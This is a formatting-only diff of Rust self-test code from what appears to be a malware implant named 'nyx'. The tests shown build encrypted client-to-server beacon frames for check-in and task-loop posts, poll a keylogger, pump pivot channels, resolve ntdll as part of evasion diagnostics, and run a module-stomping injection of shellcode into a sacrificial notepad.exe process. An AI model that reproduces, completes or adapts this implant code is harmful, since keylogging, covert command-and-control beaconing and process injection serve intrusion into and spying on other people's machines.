@@ -877,7 +877,13 @@ pub unsafe extern "system" fn nyx_selftest_csprng() {
     // Step 4: Test mem::register_key + encode_frame (the beacon frame builder).
     crate::mem::register_key(*key.as_bytes());
     let pubkey = kp.public_bytes();
-    let frame = match nyx_protocol::encode_frame_dir(&pubkey, nyx_protocol::Direction::ClientToServer, 0u64, &key, b"test_info") {
+    let frame = match nyx_protocol::encode_frame_dir(
+        &pubkey,
+        nyx_protocol::Direction::ClientToServer,
+        0u64,
+        &key,
+        b"test_info",
+    ) {
         Ok(f) => f,
         Err(_) => unsafe { exit(0xA7) }, // encode_frame seal failure (AEAD alloc)
     };
@@ -930,7 +936,13 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
     let info_plain = iw.into_bytes();
 
     // Check-in with SessionInfo payload.
-    let frame = match nyx_protocol::encode_frame_dir(&pubkey, nyx_protocol::Direction::ClientToServer, 0u64, &key, &info_plain) {
+    let frame = match nyx_protocol::encode_frame_dir(
+        &pubkey,
+        nyx_protocol::Direction::ClientToServer,
+        0u64,
+        &key,
+        &info_plain,
+    ) {
         Ok(f) => f,
         Err(_) => unsafe { exit(0xB8) }, // check-in frame seal failure
     };
@@ -962,7 +974,8 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
 
     // Simulate task-loop first POST: encode empty TaskResponse batch + send.
     let frame2 = match nyx_protocol::encode_frame_dir(
-        &pubkey, nyx_protocol::Direction::ClientToServer,
+        &pubkey,
+        nyx_protocol::Direction::ClientToServer,
         1u64,
         &key,
         &nyx_protocol::TaskResponse::encode_vec(&[]).expect("empty batch encodes trivially"),
@@ -1005,7 +1018,8 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
     crate::keylog::poll_once();
     let _ = crate::pivot::pump_channels();
     let frame3 = match nyx_protocol::encode_frame_dir(
-        &pubkey, nyx_protocol::Direction::ClientToServer,
+        &pubkey,
+        nyx_protocol::Direction::ClientToServer,
         2u64,
         &key,
         &nyx_protocol::TaskResponse::encode_vec(&[]).expect("empty batch encodes trivially"),
@@ -1032,12 +1046,19 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
 #[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_noevasion_diag() {
-    let mk = |s: &str| { write_marker("nyx_noevasion_diag.txt", s); };
+    let mk = |s: &str| {
+        write_marker("nyx_noevasion_diag.txt", s);
+    };
 
     mk("step1_ntdll\n");
     let ntdll = match crate::resolve::LiveNtdll::locate() {
         Some(n) => n,
-        None => { mk("FAIL_ntdll\n"); unsafe { exit(0xFE); } }
+        None => {
+            mk("FAIL_ntdll\n");
+            unsafe {
+                exit(0xFE);
+            }
+        }
     };
 
     mk("step2_resolve_table\n");
@@ -1059,13 +1080,23 @@ pub unsafe extern "system" fn nyx_selftest_noevasion_diag() {
     mk("step7_keygen\n");
     let kp = match nyx_protocol::ImplantKeypair::generate() {
         Ok(k) => k,
-        Err(_) => { mk("FAIL_keygen\n"); unsafe { exit(0xFF); } }
+        Err(_) => {
+            mk("FAIL_keygen\n");
+            unsafe {
+                exit(0xFF);
+            }
+        }
     };
 
     mk("step8_session_key\n");
     let key = match kp.session_key(&cfg.server_pub) {
         Ok(k) => k,
-        Err(_) => { mk("FAIL_session_key\n"); unsafe { exit(0xF7); } }
+        Err(_) => {
+            mk("FAIL_session_key\n");
+            unsafe {
+                exit(0xF7);
+            }
+        }
     };
     crate::mem::register_key(*key.as_bytes());
     let pubkey = kp.public_bytes();
@@ -1083,14 +1114,28 @@ pub unsafe extern "system" fn nyx_selftest_noevasion_diag() {
     };
     let mut iw = nyx_protocol::wire::Writer::new();
     if info.encode(&mut iw).is_err() {
-        mk("FAIL_sessioninfo_encode\n"); unsafe { exit(0xF8); }
+        mk("FAIL_sessioninfo_encode\n");
+        unsafe {
+            exit(0xF8);
+        }
     }
     let info_plain = iw.into_bytes();
 
     mk("step10_encode_frame\n");
-    let frame = match nyx_protocol::encode_frame_dir(&pubkey, nyx_protocol::Direction::ClientToServer, 0u64, &key, &info_plain) {
+    let frame = match nyx_protocol::encode_frame_dir(
+        &pubkey,
+        nyx_protocol::Direction::ClientToServer,
+        0u64,
+        &key,
+        &info_plain,
+    ) {
         Ok(f) => f,
-        Err(_) => { mk("FAIL_encode_frame\n"); unsafe { exit(0xF9); } }
+        Err(_) => {
+            mk("FAIL_encode_frame\n");
+            unsafe {
+                exit(0xF9);
+            }
+        }
     };
 
     mk("step11_dispatch_send_recv\n");
@@ -1110,11 +1155,19 @@ pub unsafe extern "system" fn nyx_selftest_noevasion_diag() {
 
     mk("step13_second_post\n");
     let frame2 = match nyx_protocol::encode_frame_dir(
-        &pubkey, nyx_protocol::Direction::ClientToServer, 1u64, &key,
+        &pubkey,
+        nyx_protocol::Direction::ClientToServer,
+        1u64,
+        &key,
         &nyx_protocol::TaskResponse::encode_vec(&[]).expect("empty batch"),
     ) {
         Ok(f) => f,
-        Err(_) => { mk("FAIL_encode_frame2\n"); unsafe { exit(0xFA); } }
+        Err(_) => {
+            mk("FAIL_encode_frame2\n");
+            unsafe {
+                exit(0xFA);
+            }
+        }
     };
     let resp2 = unsafe {
         crate::channels::dispatch_send_recv(&ch_ctx, crate::channels::get_active(), &frame2)
@@ -1293,7 +1346,7 @@ pub unsafe extern "system" fn nyx_selftest_inject_armed() {
                             // guard on `proc` terminates the never-resumed
                             // sacrificial + closes both handles when this arm
                             // ends.
-            // The armed REAL inject path (creates + real-stomps + resumes its own).
+                            // The armed REAL inject path (creates + real-stomps + resumes its own).
             match unsafe { crate::inject::module_stomp("notepad.exe", &shellcode) } {
                 Ok(_proc) => {
                     mask |= 1 << 1; // full REAL stomp path returned Ok
